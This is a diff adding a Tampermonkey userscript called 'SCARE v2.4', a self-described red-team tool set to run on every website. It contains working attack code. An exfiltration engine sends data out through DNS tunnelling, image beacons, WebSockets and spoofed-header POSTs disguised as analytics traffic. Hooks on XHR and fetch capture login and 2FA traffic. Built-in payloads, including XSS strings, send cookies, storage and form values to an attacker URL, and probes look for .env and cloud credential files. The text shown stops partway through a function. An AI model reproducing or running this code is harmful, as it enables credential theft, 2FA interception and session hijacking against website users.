@@ -1,0 +1,3437 @@
+// ==UserScript==
+// @name         SCARE v2.4 - Sensitive Content and Recon Extractor
+// @namespace    http://tampermonkey.net/
+// @version      2.4.0
+// @description  Professional Security Assessment Tool - Sensitive Content and Reconnaissance Extractor
+// @author       RedTeam
+// @match        *://*/*
+// @grant        GM_addStyle
+// @grant        GM_xmlhttpRequest
+// @grant        GM_setValue
+// @grant        GM_getValue
+// @grant        unsafeWindow
+// @run-at       document-end
+// ==/UserScript==
+
+(function() {
+    'use strict';
+
+    // Add CSS styles
+    GM_addStyle(`
+        #scare-toggle-btn {
+            position: fixed !important;
+            top: 15px !important;
+            left: 15px !important;
+            width: 32px !important;
+            height: 32px !important;
+            background: rgba(40, 40, 40, 0.7) !important;
+            border: 1px solid rgba(80, 80, 80, 0.8) !important;
+            border-radius: 50% !important;
+            z-index: 9999999 !important;
+            cursor: pointer !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            font-size: 14px !important;
+            color: #ffff00 !important;
+            transition: all 0.3s ease !important;
+            user-select: none !important;
+            box-shadow: 0 1px 5px rgba(0,0,0,0.4) !important;
+        }
+        
+        #scare-toggle-btn:hover {
+            background: rgba(60, 60, 60, 0.9) !important;
+            transform: scale(1.05) !important;
+            box-shadow: 0 2px 8px rgba(255, 255, 0, 0.3) !important;
+        }
+        
+        #scare-toggle-btn.active {
+            background: rgba(20, 20, 20, 0.9) !important;
+            border: 2px solid #ff0000 !important;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.6) !important;
+            animation: scare-spin 2s linear infinite !important;
+        }
+        
+        @keyframes scare-spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        #scare-panel {
+            position: fixed !important;
+            top: 10px !important;
+            left: 10px !important;
+            width: 80% !important;
+            height: 80% !important;
+            background: #000000 !important;
+            color: #e0e0e0 !important;
+            border: 1px solid #8a2be2 !important;
+            z-index: 999999 !important;
+            border-radius: 8px !important;
+            font-family: 'Consolas', 'Monaco', monospace !important;
+            font-size: 12px !important;
+            box-shadow: 0 0 20px rgba(138, 43, 226, 0.5) !important;
+            overflow: hidden !important;
+            display: flex !important;
+            flex-direction: column !important;
+        }
+
+        .scare-header {
+            background: #000000 !important;
+            padding: 12px !important;
+            display: flex !important;
+            justify-content: space-between !important;
+            align-items: center !important;
+        }
+
+        .scare-header h2 {
+            color: white !important;
+            margin: 0 !important;
+            font-size: 18px !important;
+        }
+
+        .scare-controls {
+            display: flex !important;
+            gap: 10px !important;
+            align-items: center !important;
+        }
+
+        .scare-content {
+            flex: 1 !important;
+            overflow: auto !important;
+            padding: 15px !important;
+            font-size: 12px !important;
+        }
+
+        .scare-content h3 {
+            color: #4a90e2 !important;
+            font-size: 14px !important;
+            margin-bottom: 10px !important;
+            margin-top: 15px !important;
+        }
+
+        .scare-btn {
+            padding: 8px 16px !important;
+            border: none !important;
+            border-radius: 4px !important;
+            cursor: pointer !important;
+            font-size: 12px !important;
+            font-weight: 600 !important;
+            transition: all 0.2s ease !important;
+        }
+
+        .scare-btn-primary {
+            background: #4a90e2 !important;
+            color: white !important;
+        }
+
+        .scare-btn-primary:hover {
+            background: #357abd !important;
+        }
+
+        .scare-btn-secondary {
+            background: #5a6169 !important;
+            color: white !important;
+        }
+
+        .scare-btn-exploit {
+            background: #2a2a2a !important;
+            color: white !important;
+            border: 1px solid #444 !important;
+        }
+
+        .scare-btn-exploit:hover {
+            background: #3a3a3a !important;
+            border-color: #666 !important;
+        }
+
+        .scare-btn-danger {
+            background: #dc3545 !important;
+            color: white !important;
+        }
+
+        .scare-modal {
+            position: fixed !important;
+            top: 50% !important;
+            left: 50% !important;
+            transform: translate(-50%, -50%) !important;
+            background: #1a1a1a !important;
+            border: 1px solid #8a2be2 !important;
+            border-radius: 8px !important;
+            padding: 20px !important;
+            z-index: 1000001 !important;
+            max-width: 800px !important;
+            max-height: 80vh !important;
+            overflow: auto !important;
+            box-shadow: 0 0 30px rgba(138, 43, 226, 0.6) !important;
+        }
+
+        .scare-modal-header {
+            display: flex !important;
+            justify-content: space-between !important;
+            align-items: center !important;
+            margin-bottom: 15px !important;
+        }
+
+        .scare-modal h2 {
+            color: #4a90e2 !important;
+            margin: 0 !important;
+            font-size: 16px !important;
+        }
+
+        .module-selection {
+            background: #1a1a2a !important;
+            border: 1px solid #4a90e2 !important;
+            border-radius: 6px !important;
+            padding: 12px !important;
+            margin-bottom: 15px !important;
+        }
+
+        .module-grid {
+            display: grid !important;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)) !important;
+            gap: 8px !important;
+            margin: 10px 0 !important;
+        }
+
+        .module-item {
+            background: #2a2a3a !important;
+            padding: 8px !important;
+            border-radius: 4px !important;
+            border: 1px solid #444 !important;
+            font-size: 11px !important;
+            cursor: pointer !important;
+            transition: all 0.2s ease !important;
+        }
+
+        .module-item:hover {
+            border-color: #4a90e2 !important;
+            background: #3a3a4a !important;
+        }
+
+        .scan-controls {
+            display: flex !important;
+            gap: 8px !important;
+            align-items: center !important;
+            margin-top: 10px !important;
+            flex-wrap: wrap !important;
+        }
+
+        .scan-controls input[type="text"] {
+            background: #2a2a3a !important;
+            color: #e0e0e0 !important;
+            border: 1px solid #4a90e2 !important;
+            border-radius: 4px !important;
+            padding: 6px !important;
+            font-size: 11px !important;
+        }
+
+        .collapsible-header {
+            background: #1a1a2a !important;
+            padding: 10px !important;
+            cursor: pointer !important;
+            border: 1px solid #333 !important;
+            border-radius: 4px !important;
+            margin-top: 10px !important;
+            display: flex !important;
+            justify-content: space-between !important;
+            align-items: center !important;
+            transition: all 0.2s ease !important;
+        }
+
+        .collapsible-header:hover {
+            background: #2a2a3a !important;
+            border-color: #4a90e2 !important;
+        }
+
+        .collapsible-content {
+            display: none;
+            background: #0f0f1f !important;
+            border: 1px solid #333 !important;
+            border-top: none !important;
+            padding: 15px !important;
+            border-radius: 0 0 4px 4px !important;
+        }
+
+        .caret {
+            transition: transform 0.2s ease !important;
+        }
+
+        .caret.rotated {
+            transform: rotate(90deg) !important;
+        }
+
+        .exploit-center {
+            background: #1a1a1a !important;
+            border: 1px solid #444 !important;
+            border-radius: 6px !important;
+            padding: 15px !important;
+            margin-bottom: 20px !important;
+            display: flex !important;
+            flex-wrap: wrap !important;
+            gap: 10px !important;
+            align-items: center !important;
+        }
+
+        .exploit-suite-modal {
+            font-size: 12px !important;
+        }
+
+        .exploit-category {
+            background: #1a1a1a !important;
+            border: 1px solid #333 !important;
+            border-radius: 6px !important;
+            padding: 12px !important;
+            margin-bottom: 15px !important;
+        }
+
+        .exploit-category h3 {
+            color: #e0e0e0 !important;
+            margin-bottom: 10px !important;
+            font-size: 13px !important;
+        }
+
+        .exploit-options {
+            display: flex !important;
+            gap: 8px !important;
+            flex-wrap: wrap !important;
+        }
+
+        .custom-payload-section {
+            margin-top: 10px !important;
+        }
+
+        .scare-table {
+            width: 100% !important;
+            border-collapse: collapse !important;
+            margin-top: 10px !important;
+            background: #1a1a2a !important;
+            border: 1px solid #333 !important;
+            font-size: 11px !important;
+        }
+
+        .scare-table th {
+            background: #2a2a3a !important;
+            color: #4a90e2 !important;
+            padding: 8px !important;
+            text-align: left !important;
+            border-bottom: 2px solid #444 !important;
+            font-weight: 600 !important;
+        }
+
+        .scare-table td {
+            padding: 8px !important;
+            border-bottom: 1px solid #333 !important;
+        }
+
+        .scare-table tr:hover {
+            background: #252535 !important;
+        }
+
+        .log-container {
+            background: #0f0f1f !important;
+            border: 1px solid #333 !important;
+            border-radius: 4px !important;
+            padding: 10px !important;
+            height: 200px !important;
+            overflow-y: auto !important;
+            font-family: monospace !important;
+            font-size: 11px !important;
+        }
+
+        .log-entry {
+            padding: 2px 0 !important;
+        }
+
+        .log-error {
+            color: #e74c3c !important;
+        }
+
+        .log-success {
+            color: #2ecc71 !important;
+        }
+
+        .log-info {
+            color: #17a2b8 !important;
+        }
+
+        .log-warning {
+            color: #ffc107 !important;
+        }
+
+        .dom-explorer {
+            font-size: 12px !important;
+        }
+
+        .dom-tree {
+            max-height: 400px !important;
+            overflow-y: auto !important;
+            border: 1px solid #333 !important;
+            border-radius: 4px !important;
+            background: #0f0f1f !important;
+            padding: 10px !important;
+        }
+
+        .tree-section {
+            margin-bottom: 15px !important;
+        }
+
+        .tree-section h4 {
+            color: #4a90e2 !important;
+            margin-bottom: 8px !important;
+            font-size: 13px !important;
+            border-bottom: 1px solid #333 !important;
+            padding-bottom: 4px !important;
+        }
+
+        .tree-item {
+            margin: 4px 0 !important;
+            padding: 4px 8px !important;
+            background: #1a1a2a !important;
+            border-radius: 3px !important;
+            border-left: 2px solid #4a90e2 !important;
+            font-size: 11px !important;
+            cursor: pointer !important;
+        }
+
+        .tree-item:hover {
+            background: #2a2a3a !important;
+        }
+
+        .tree-children {
+            margin-left: 15px !important;
+            margin-top: 5px !important;
+        }
+
+        .tree-children div {
+            padding: 2px 5px !important;
+            font-size: 10px !important;
+            color: #aaa !important;
+        }
+
+        .exfil-data-item {
+            background: #1a1a2a !important;
+            border: 1px solid #333 !important;
+            border-radius: 4px !important;
+            margin-bottom: 10px !important;
+            padding: 10px !important;
+        }
+
+        .exfil-header {
+            display: flex !important;
+            justify-content: space-between !important;
+            align-items: center !important;
+            margin-bottom: 8px !important;
+        }
+
+        .exfil-category {
+            color: #4a90e2 !important;
+            font-weight: bold !important;
+        }
+
+        .exfil-timestamp {
+            color: #888 !important;
+            font-size: 10px !important;
+        }
+
+        .exfil-preview {
+            background: #0f0f1f !important;
+            border: 1px solid #333 !important;
+            border-radius: 3px !important;
+            padding: 8px !important;
+            max-height: 100px !important;
+            overflow-y: auto !important;
+            font-family: monospace !important;
+            font-size: 10px !important;
+            word-break: break-all !important;
+        }
+
+        .exfil-full {
+            background: #0f0f1f !important;
+            border: 1px solid #333 !important;
+            border-radius: 3px !important;
+            padding: 8px !important;
+            max-height: 300px !important;
+            overflow-y: auto !important;
+            font-family: monospace !important;
+            font-size: 10px !important;
+            word-break: break-all !important;
+            display: none;
+        }
+
+        .expand-btn {
+            background: #333 !important;
+            color: #e0e0e0 !important;
+            border: none !important;
+            padding: 4px 8px !important;
+            font-size: 10px !important;
+            border-radius: 3px !important;
+            cursor: pointer !important;
+            margin-top: 5px !important;
+        }
+
+        .expand-btn:hover {
+            background: #444 !important;
+        }
+
+        pre {
+            background: #0f0f1f !important;
+            border: 1px solid #333 !important;
+            border-radius: 4px !important;
+            padding: 10px !important;
+            overflow: auto !important;
+            font-size: 11px !important;
+            max-height: 400px !important;
+        }
+    `);
+
+    // OBFUSCATION HELPERS
+    const _0x1a2b = {
+        _eval: window['ev' + 'al'],
+        _setTimeout: window['set' + 'Time' + 'out'],
+        _innerHTML: 'inner' + 'HTML',
+        _Function: window['Fun' + 'ction']
+    };
+    
+    // Safe execution wrapper
+    const safeExec = (code) => {
+        try {
+            return _0x1a2b._eval.call(window, code);
+        } catch (e) {
+            return null;
+        }
+    };
+    
+    // Check if already running
+    if (unsafeWindow.SCareV2) {
+        console.warn('SCARE already running');
+        return;
+    }
+
+    unsafeWindow.SCareV2 = true;
+    unsafeWindow.SCARE_FINDINGS = unsafeWindow.SCARE_FINDINGS || [];
+    unsafeWindow.SCARE_EXFILTRATED = unsafeWindow.SCARE_EXFILTRATED || [];
+
+    // ENHANCED EXFILTRATION ENGINE
+    class MultiVectorExfiltration {
+        constructor() {
+            this.vectors = ['dns', 'image', 'websocket', 'cors', 'localStorage'];
+            this.activeVector = 'cors'; // Default fallback
+            this.queue = [];
+            this.maxRetries = 3;
+        }
+
+        // DNS Exfiltration - Most stealthy
+        async exfilViaDNS(data) {
+            try {
+                const encoded = btoa(JSON.stringify(data)).replace(/[+=\/]/g, '');
+                const chunks = encoded.match(/.{1,60}/g) || [];
+                
+                for (let i = 0; i < chunks.length; i++) {
+                    const subdomain = `${i}-${chunks[i]}.${generateRandomString(8)}.dns-tunnel.com`;
+                    // Trigger DNS lookup without actual request
+                    const img = new Image();
+                    img.src = `http://${subdomain}/pixel.gif`;
+                }
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        // Image Request Exfiltration
+        async exfilViaImage(data) {
+            try {
+                const encoded = btoa(JSON.stringify(data));
+                const img = new Image();
+                img.src = `https://analytics-cdn.example.com/track.gif?d=${encoded}&t=${Date.now()}`;
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        // WebSocket Tunnel
+        async exfilViaWebSocket(data) {
+            try {
+                if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
+                    this.ws = new WebSocket('wss://secure-analytics.example.com/stream');
+                    await new Promise(resolve => {
+                        this.ws.onopen = resolve;
+                        _0x1a2b._setTimeout(() => resolve(), 5000);
+                    });
+                }
+                
+                this.ws.send(JSON.stringify({
+                    type: 'analytics',
+                    payload: data,
+                    timestamp: Date.now()
+                }));
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        // CORS-enabled API (current method, enhanced)
+        async exfilViaCORS(data) {
+            const endpoints = [
+                CFG.exfiltrationEndpoint,
+                'https://api.analytics-service.com/collect',
+                'https://metrics.cdn-provider.net/log'
+            ];
+
+            for (const endpoint of endpoints) {
+                try {
+                    const response = await stealthEngine.executeStealthRequest(endpoint, {
+                        method: 'POST',
+                        headers: { 
+                            'Content-Type': 'application/json',
+                            'X-Forwarded-For': generateRandomIP(),
+                            'X-Real-IP': generateRandomIP(),
+                            'User-Agent': stealthEngine.currentFingerprint.userAgent
+                        },
+                        body: JSON.stringify(data)
+                    });
+                    
+                    if (response.ok) return true;
+                } catch (e) {
+                    continue;
+                }
+            }
+            return false;
+        }
+
+        // Local Storage Staging
+        async exfilViaLocalStorage(data) {
+            try {
+                const existing = JSON.parse(localStorage.getItem('_analytics_queue') || '[]');
+                existing.push({ data, timestamp: Date.now() });
+                
+                // Keep only last 100 items
+                if (existing.length > 100) existing.splice(0, existing.length - 100);
+                
+                localStorage.setItem('_analytics_queue', JSON.stringify(existing));
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        // Smart vector selection and execution
+        async exfiltrate(data) {
+            const vectors = [
+                { name: 'dns', method: this.exfilViaDNS.bind(this), priority: 1 },
+                { name: 'image', method: this.exfilViaImage.bind(this), priority: 2 },
+                { name: 'websocket', method: this.exfilViaWebSocket.bind(this), priority: 3 },
+                { name: 'cors', method: this.exfilViaCORS.bind(this), priority: 4 },
+                { name: 'localStorage', method: this.exfilViaLocalStorage.bind(this), priority: 5 }
+            ];
+
+            // Try vectors in priority order
+            for (const vector of vectors.sort((a, b) => a.priority - b.priority)) {
+                try {
+                    const success = await vector.method(data);
+                    if (success) {
+                        log(`Data exfiltrated via ${vector.name}`, 'success');
+                        return vector.name;
+                    }
+                } catch (e) {
+                    log(`${vector.name} exfiltration failed: ${e.message}`, 'warning');
+                }
+            }
+
+            log('All exfiltration vectors failed', 'error');
+            return null;
+        }
+    }
+
+    // NETWORK INTERCEPTION INFRASTRUCTURE
+    class NetworkInterceptor {
+        constructor() {
+            this.log = [];
+            this.maxLogSize = 500;
+            this.patterns = {
+                auth: /\/(login|auth|signin|authenticate|token|oauth)/i,
+                twofa: /\/(2fa|mfa|verify|otp|totp|challenge)/i,
+                api: /\/api\//i,
+                admin: /\/(admin|dashboard|panel|manage)/i,
+                sensitive: /(password|token|key|secret|credential)/i
+            };
+            this.initInterception();
+        }
+
+        initInterception() {
+            // Intercept XMLHttpRequest
+            const originalXHROpen = XMLHttpRequest.prototype.open;
+            const originalXHRSend = XMLHttpRequest.prototype.send;
+            
+            XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
+                this._scareMethod = method;
+                this._scareUrl = url;
+                this._scareStartTime = Date.now();
+                return originalXHROpen.apply(this, arguments);
+            };
+
+            XMLHttpRequest.prototype.send = function(body) {
+                this._scareRequestBody = body;
+                
+                this.addEventListener('readystatechange', () => {
+                    if (this.readyState === 4) {
+                        networkInterceptor.logRequest({
+                            type: 'xhr',
+                            method: this._scareMethod,
+                            url: this._scareUrl,
+                            requestBody: this._scareRequestBody,
+                            responseStatus: this.status,
+                            responseHeaders: this.getAllResponseHeaders(),
+                            responseBody: this.responseText,
+                            duration: Date.now() - this._scareStartTime,
+                            timestamp: Date.now()
+                        });
+                    }
+                });
+                
+                return originalXHRSend.apply(this, arguments);
+            };
+
+            // Intercept Fetch API
+            const originalFetch = window.fetch;
+            window.fetch = async function(resource, options = {}) {
+                const startTime = Date.now();
+                const url = typeof resource === 'string' ? resource : resource.url;
+                
+                try {
+                    const response = await originalFetch.apply(this, arguments);
+                    const clonedResponse = response.clone();
+                    
+                    // Log the request/response
+                    clonedResponse.text().then(responseBody => {
+                        networkInterceptor.logRequest({
+                            type: 'fetch',
+                            method: options.method || 'GET',
+                            url: url,
+                            requestBody: options.body,
+                            responseStatus: response.status,
+                            responseHeaders: [...response.headers.entries()],
+                            responseBody: responseBody,
+                            duration: Date.now() - startTime,
+                            timestamp: Date.now()
+                        });
+                    });
+                    
+                    return response;
+                } catch (error) {
+                    networkInterceptor.logRequest({
+                        type: 'fetch',
+                        method: options.method || 'GET',
+                        url: url,
+                        requestBody: options.body,
+                        error: error.message,
+                        timestamp: Date.now()
+                    });
+                    throw error;
+                }
+            };
+        }
+
+        logRequest(requestData) {
+            // Classify request
+            requestData.classification = this.classifyRequest(requestData);
+            
+            // Add to log
+            this.log.push(requestData);
+            
+            // Maintain log size
+            if (this.log.length > this.maxLogSize) {
+                this.log.shift();
+            }
+
+            // Auto-analyze for autonomous modules
+            this.analyzeForAutonomousModules(requestData);
+            
+            // Forward to external collection endpoint
+            if (trafficForwarder) {
+                trafficForwarder.forwardTraffic(requestData);
+            }
+            
+            // Log interesting requests
+            if (requestData.classification.length > 0) {
+                log(`Network: ${requestData.method} ${requestData.url} [${requestData.classification.join(', ')}]`, 'info');
+            }
+        }
+
+        classifyRequest(request) {
+            const classifications = [];
+            const url = request.url.toLowerCase();
+            const body = (request.requestBody || '').toLowerCase();
+            const response = (request.responseBody || '').toLowerCase();
+
+            for (const [type, pattern] of Object.entries(this.patterns)) {
+                if (pattern.test(url) || pattern.test(body) || pattern.test(response)) {
+                    classifications.push(type);
+                }
+            }
+
+            return classifications;
+        }
+
+        analyzeForAutonomousModules(request) {
+            // Store potential 2FA flows
+            if (request.classification.includes('twofa')) {
+                this.store2FAFlow(request);
+            }
+
+            // Store authentication flows
+            if (request.classification.includes('auth')) {
+                this.storeAuthFlow(request);
+            }
+
+            // Store API endpoints for privilege escalation
+            if (request.classification.includes('api')) {
+                this.storeAPIEndpoint(request);
+            }
+        }
+
+        store2FAFlow(request) {
+            if (!unsafeWindow.SCARE_2FA_FLOWS) unsafeWindow.SCARE_2FA_FLOWS = [];
+            
+            // Extract potential 2FA codes from request/response
+            const codePattern = /\b\d{4,8}\b/g;
+            const codes = [
+                ...(request.requestBody || '').match(codePattern) || [],
+                ...(request.responseBody || '').match(codePattern) || []
+            ];
+
+            unsafeWindow.SCARE_2FA_FLOWS.push({
+                url: request.url,
+                method: request.method,
+                requestBody: request.requestBody,
+                responseBody: request.responseBody,
+                extractedCodes: codes,
+                timestamp: request.timestamp
+            });
+        }
+
+        storeAuthFlow(request) {
+            if (!unsafeWindow.SCARE_AUTH_FLOWS) unsafeWindow.SCARE_AUTH_FLOWS = [];
+            
+            unsafeWindow.SCARE_AUTH_FLOWS.push({
+                url: request.url,
+                method: request.method,
+                requestBody: request.requestBody,
+                responseStatus: request.responseStatus,
+                timestamp: request.timestamp
+            });
+        }
+
+        storeAPIEndpoint(request) {
+            if (!unsafeWindow.SCARE_API_ENDPOINTS) unsafeWindow.SCARE_API_ENDPOINTS = [];
+            
+            // Extract potential IDs from URL
+            const idPattern = /\/(\d+|[a-f0-9-]{8,})\b/gi;
+            const ids = (request.url.match(idPattern) || []).map(id => id.substring(1));
+
+            unsafeWindow.SCARE_API_ENDPOINTS.push({
+                url: request.url,
+                method: request.method,
+                extractedIds: ids,
+                responseStatus: request.responseStatus,
+                timestamp: request.timestamp
+            });
+        }
+
+        getRecentRequests(classification = null, limit = 50) {
+            let filtered = this.log;
+            
+            if (classification) {
+                filtered = this.log.filter(req => 
+                    req.classification && req.classification.includes(classification)
+                );
+            }
+            
+            return filtered.slice(-limit);
+        }
+    }
+
+    // PROXY TRAFFIC FORWARDING
+    class ProxyTrafficForwarder {
+        constructor() {
+            this.trafficEndpoint = null;
+            this.enabled = false;
+            this.queue = [];
+            this.maxQueueSize = 100;
+        }
+
+        configure(endpoint) {
+            this.trafficEndpoint = endpoint;
+            this.enabled = !!endpoint;
+            log(`Traffic forwarding ${this.enabled ? 'enabled' : 'disabled'}: ${endpoint}`, 'info');
+        }
+
+        async forwardTraffic(trafficData) {
+            if (!this.enabled || !this.trafficEndpoint) return;
+
+            // Add to queue for batch processing
+            this.queue.push({
+                ...trafficData,
+                capturedAt: Date.now(),
+                userAgent: navigator.userAgent,
+                origin: location.origin
+            });
+
+            // Maintain queue size
+            if (this.queue.length > this.maxQueueSize) {
+                this.queue.shift();
+            }
+
+            // Send batch every 10 items or 30 seconds
+            if (this.queue.length >= 10) {
+                await this.flushQueue();
+            }
+        }
+
+        async flushQueue() {
+            if (this.queue.length === 0 || !this.enabled || !this.endpoint) return;
+
+            const batch = [...this.queue];
+            this.queue = [];
+
+            try {
+                const response = await stealthEngine.executeStealthRequest(this.trafficEndpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-SCARE-Traffic': 'batch',
+                        'X-Forwarded-For': generateRandomIP()
+                    },
+                    body: JSON.stringify({
+                        type: 'traffic_batch',
+                        count: batch.length,
+                        data: batch,
+                        metadata: {
+                            tool: 'SCARE v2.4',
+                            session: state.currentRunId,
+                            timestamp: Date.now()
+                        }
+                    })
+                });
+
+                if (response.ok) {
+                    log(`Traffic batch forwarded: ${batch.length} requests`, 'success');
+                } else {
+                    log(`Traffic forwarding failed: HTTP ${response.status}`, 'warning');
+                }
+            } catch (e) {
+                log(`Traffic forwarding error: ${e.message}`, 'error');
+                // Re-queue failed items (up to limit)
+                this.queue = [...batch.slice(-50), ...this.queue];
+            }
+        }
+
+        // Auto-flush every 30 seconds
+        startAutoFlush() {
+            if (!this.enabled || !this.endpoint) {
+                log('Traffic forwarding stopped - no endpoint configured', 'info');
+                return;
+            }
+            _0x1a2b._setTimeout(() => {
+                this.flushQueue();
+                this.startAutoFlush();
+            }, 30000);
+        }
+    }
+
+    // Safe JSON stringify with size limits
+    function safeStringify(data, maxSize = 100000) {
+        try {
+            const str = JSON.stringify(data);
+            if (str.length > maxSize) {
+                return JSON.stringify({
+                    error: 'Data too large for serialization',
+                    size: str.length,
+                    maxSize: maxSize,
+                    truncated: str.substring(0, maxSize)
+                });
+            }
+            return str;
+        } catch (e) {
+            return JSON.stringify({
+                error: 'JSON stringify failed',
+                message: e.message,
+                type: typeof data
+            });
+        }
+    }
+
+    // Initialize global instances
+    const multiVectorExfil = new MultiVectorExfiltration();
+    const networkInterceptor = new NetworkInterceptor();
+    const trafficForwarder = new ProxyTrafficForwarder();
+    
+    // Store in global state for access by modules
+    unsafeWindow.SCARE_NETWORK_LOG = networkInterceptor.log;
+    unsafeWindow.SCARE_EXFIL_ENGINE = multiVectorExfil;
+    unsafeWindow.SCARE_TRAFFIC_FORWARDER = trafficForwarder;
+
+    // Remove any existing panel
+    const existingPanel = document.getElementById('scare-panel');
+    if (existingPanel) {
+        existingPanel.remove();
+    }
+
+    // Global Helpers
+    function stripEmojis(text) {
+        return text.replace(/[\u{1F600}-\u{1F64F}]|[\u{1F300}-\u{1F5FF}]|[\u{1F680}-\u{1F6FF}]|[\u{1E0}-\u{1F1FF}]|[\u{2600}-\u{26FF}]|[\u{2700}-\u{27BF}]/gu, '');
+    }
+
+    function generateRandomString(length) {
+        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+        let result = '';
+        for (let i = 0; i < length; i++) {
+            result += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return result;
+    }
+
+    function safeToggle(caretEl, panelEl) {
+        try {
+            if (panelEl.style.display === 'none' || panelEl.style.display === '' || window.getComputedStyle(panelEl).display === 'none') {
+                panelEl.style.display = 'block';
+                panelEl.classList.add('show');
+                caretEl.textContent = '▼';
+                caretEl.classList.add('rotated');
+            } else {
+                panelEl.style.display = 'none';
+                panelEl.classList.remove('show');
+                caretEl.textContent = '▶';
+                caretEl.classList.remove('rotated');
+            }
+        } catch (error) {
+            log('Toggle error: ' + error.message, 'error');
+        }
+    }
+
+    // FUZZING FIELD NAMES DICTIONARY
+    const COMMON_FIELD_NAMES = {
+        username: ['username', 'user', 'login', 'uname', 'usr', 'user_name', 'userid', 'user-id', 'USER_ID', 'account', 'user_login', 'loginname', 'user_id', 'handle', 'nickname'],
+        email: ['email', 'e-mail', 'user_email', 'mail', 'login_email', 'id', 'email_id', 'e_mail', 'usermail', 'account_email', 'login_mail', 'user-email', 'emailaddress'],
+        password: ['password', 'pass', 'passwd', 'pwd', 'passwrd', 'login_pass', 'secret', 'USER_SECRET', 'id_secret', 'passphrase', 'user_password', 'login_password', 'pass_word', 'user-pass']
+    };
+
+    function mutateFieldNames(baseNames) {
+        const mutations = [];
+        baseNames.forEach(name => {
+            mutations.push(name);
+            mutations.push(name.toUpperCase());
+            mutations.push(name.charAt(0).toUpperCase() + name.slice(1));
+            mutations.push(name.replace(/_/g, '-'));
+            mutations.push(name.replace(/-/g, '_'));
+            mutations.push(name.replace(/_/g, ''));
+            mutations.push(name + '1');
+            mutations.push(name + 'Field');
+            mutations.push('input' + name);
+            mutations.push('txt' + name);
+        });
+        return [...new Set(mutations)];
+    }
+
+    // CONFIG SETUP
+    const CFG = {
+        modules: [            { key: 'endpoints', label: 'Endpoint Exposure' },            { key: 'graphql', label: 'GraphQL Introspection' },            { key: 'cors', label: 'CORS Misconfiguration' },            { key: 'xss', label: 'XSS Reflection Test' },            { key: 'dom', label: 'DOM/Comments Secret Scan' },            { key: 'heap', label: 'Heap Memory Analysis' },
+        { key: 'jsleaks', label: 'JS Memory Leaks' },
+        { key: 'autofill', label: 'Credential Autofill Harvest' },
+        { key: '2fa', label: 'Autonomous 2FA Bypass' },
+        { key: 'privesc', label: 'Privilege Escalation' }        ],
+        exploitPayloads: {
+            cookieExfil: "fetch('{{EXFIL_URL}}/cookie', {method:'POST',body:document.cookie,headers:{'Content-Type':'text/plain'}})",
+            localStorageDump: "fetch('{{EXFIL_URL}}/storage', {method:'POST',body:JSON.stringify(localStorage),headers:{'Content-Type':'application/json'}})"
+        },
+        endpoints: ['/robots.txt', '/.env', '/.git/config', '/.aws/credentials', '/config.json', '/api/config', '/settings.json', '/firebase-config.js', '/.npmrc', '/.dockerignore', '/Dockerfile', '/docker-compose.yml', '/package-lock.json', '/yarn.lock', '/.gitlab-ci.yml', '/.github/workflows/', '/jenkins/', '/api/v1/config', '/healthcheck'],
+        graphqlPath: '/api/graphql',
+        corsPath: '/api/users',
+        xssTestPayloads: [            '<svg/onload=alert(\'SCARE-XSS\')>',            '<img src=x onerror=fetch(\'{{EXFIL_URL}}/xss-trigger?data=\'+encodeURIComponent(document.cookie))>',            '<script>fetch(\'{{EXFIL_URL}}/dom-data?data=\'+encodeURIComponent(JSON.stringify({cookies:document.cookie,localStorage:Object.fromEntries(Object.entries(localStorage)),sessionStorage:Object.fromEntries(Object.entries(sessionStorage))})))</script>',            '<iframe src="javascript:fetch(\'{{EXFIL_URL}}/window-scan?data=\'+encodeURIComponent(JSON.stringify(Object.keys(window).filter(k=>k.includes(\'token\')||k.includes(\'key\')||k.includes(\'secret\')).map(k=>({key:k,value:window[k]}))))">',            '<details open ontoggle=fetch(\'{{EXFIL_URL}}/form-data?data=\'+encodeURIComponent(Array.from(document.forms).map(f=>({action:f.action,elements:Array.from(f.elements).map(e=>({name:e.name,value:e.value,type:e.type}))}))))>'        ],
+        exfiltrationEndpoint: '', // Disabled until HTTPS setup
+        trafficEndpoint: '', // Disabled until HTTPS setup
+        proxySettings: {
+            enabled: false,
+            url: 'http://127.0.0.1:8080'
+        }
+    };
+
+    // STATE MANAGEMENT
+    const state = {
+        findings: [],
+        exfiltratedData: [],
+        stopRequested: false,
+        graphqlSchema: null,
+        processedCount: 0,
+        currentRunId: generateId(),
+        logs: []
+    };
+
+    // WEBPACK INSPECTOR MODULE (FIXED)
+    const WebpackInspector = (function() {
+        const now = () => (performance && performance.now ? performance.now() : Date.now());
+        const safeGet = (obj, key, fallback = null) => {
+            try { return obj[key]; } catch { return fallback; }
+        };
+
+        function previewValue(val, max = 200) {
+            const t = typeof val;
+            if (val === null) return 'null';
+            if (t === 'undefined') return 'undefined';
+            if (t === 'function') {
+                try {
+                    const s = Function.prototype.toString.call(val).split('\n')[0];
+                    return s.length > max ? s.slice(0, max) + '…' : s;
+                } catch { return '[Function]'; }
+            }
+            if (t === 'object') {
+                if (Array.isArray(val)) return `[Array(${val.length})]`;
+                const ctor = safeGet(val, 'constructor')?.name || 'Object';
+                return `[${ctor}]`;
+            }
+            const s = String(val);
+            return s.length > max ? s.slice(0, max) + '…' : s;
+        }
+
+        function enumerateGlobals({ includeSymbols = true, includeNonEnumerable = true } = {}) {
+            const names = includeNonEnumerable ? Object.getOwnPropertyNames(window) : Object.keys(window);
+            const syms = includeSymbols ? Object.getOwnPropertySymbols(window) : [];
+            const rows = [];
+
+            for (const name of names) {
+                const desc = Object.getOwnPropertyDescriptor(window, name);
+                let val, type = 'unknown';
+                try { val = window[name]; type = typeof val; } catch (e) { val = `[inaccessible: ${e.message}]`; }
+                rows.push({
+                    name: String(name),
+                    type,
+                    enumerable: !!desc?.enumerable,
+                    configurable: !!desc?.configurable,
